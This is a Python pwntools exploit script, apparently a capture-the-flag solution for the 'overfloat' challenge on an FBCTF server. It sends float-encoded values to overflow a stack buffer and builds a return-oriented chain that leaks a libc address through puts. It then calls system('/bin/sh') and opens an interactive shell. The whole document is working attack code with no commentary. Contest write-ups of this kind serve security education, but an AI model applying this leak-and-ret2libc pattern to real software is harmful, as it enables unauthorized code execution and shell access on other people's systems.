from pwn import *
  
#sh = process("./overfloat")  
b = ELF("./overfloat")
libc = ELF("./libc-2.27.so")
sh = remote("challenges.fbctf.com", 1341)

def int_to_float(num):
    bit = bin(num)
    return struct.unpack('!f',struct.pack('!I', int(bit, 2)))[0]

def set_float(num) :
    print sh.recvuntil("]: ")
    float_ = int_to_float(num)
    sh.sendline(str(float_))

def set_addr(addr) :
    addr_ = str(hex(addr))[2:].zfill(16)
    addr_l = int(addr_[8:],16)
    addr_h = int(addr_[:8],16)
    set_float(addr_l)
    set_float(addr_h)

if __name__ == "__main__" :
    main_addr = b.sym['main']
    pop_rdi = 0x0000000000400a83 #  pop rdi; ret;  
    puts_got = b.got['puts']
    puts_plt = b.sym['puts']

    for i in range(14) :
        set_float(0x61616161)
    set_addr(pop_rdi)
    set_addr(puts_got)
    set_addr(puts_plt)
    set_addr(main_addr)

    sh.recv()
    print sh.sendline("done")
    print sh.recvuntil("BON VOYAGE!\n")
    puts_got_ = u64(sh.recvuntil("\n").strip() + "\x00\x00")
    libc.address = puts_got_ - libc.sym['puts']
    system_addr = libc.sym['system']
    binsh = next(libc.search('/bin/sh'))

    log.success("puts_got = " + hex(puts_got_))
    log.success("libc_addr = "+hex(libc.address))
    log.success("system_addr = " + hex(system_addr))
    log.success("binsh_addr = " + hex(binsh))

    # pass 
    print("-----------------The second ---------------------")
    for i in range(14) :
        set_float(0x61616161)
    set_addr(pop_rdi)
    set_addr(binsh)
    set_addr(system_addr)
    set_addr(pop_rdi)
    set_addr(binsh)
    set_addr(system_addr)
    sh.recv()
    sh.sendline("done")
    sh.interactive()